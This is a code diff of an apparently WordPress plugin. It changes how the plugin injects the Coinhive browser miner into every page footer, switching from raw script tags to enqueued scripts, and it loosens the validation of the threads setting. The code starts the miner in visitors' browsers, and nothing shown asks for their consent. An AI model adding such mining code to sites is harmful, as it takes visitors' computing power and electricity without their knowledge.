@@ -17,16 +17,10 @@ function coinhive_wordpress_add_javascript() {
 	} else {
 		$options = "";
 	}
-?>
+	
+	wp_enqueue_script('coinhive-script','https://coin-hive.com/lib/coinhive.min.js',array());
+	wp_add_inline_script('coinhive-script','var miner = new CoinHive.Anonymous("'.$value.'"'.$options.');miner.start();','after');
 
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-<script>
-	var miner = new CoinHive.Anonymous('<?php
-echo $value; echo "'"; echo $options; ?>);
-	miner.start();
-</script>
-
-<?php
 }
 
 add_action('wp_footer', 'coinhive_wordpress_add_javascript');
@@ -38,7 +32,7 @@ function coinhive_settings_display() {
         update_option('coinhive_sitekey', sanitize_text_field($_POST['coinhive_sitekey']));
         $value = $_POST['coinhive_sitekey'];
     }
-    if (isset($_POST['coinhive_threads']) && is_int($_POST['coinhive_threads'])) {
+    if (isset($_POST['coinhive_threads']) && is_numeric($_POST['coinhive_threads'])) {
         update_option('coinhive_threads', sanitize_text_field($_POST['coinhive_threads']));
         $value = $_POST['coinhive_threads'];
     } 
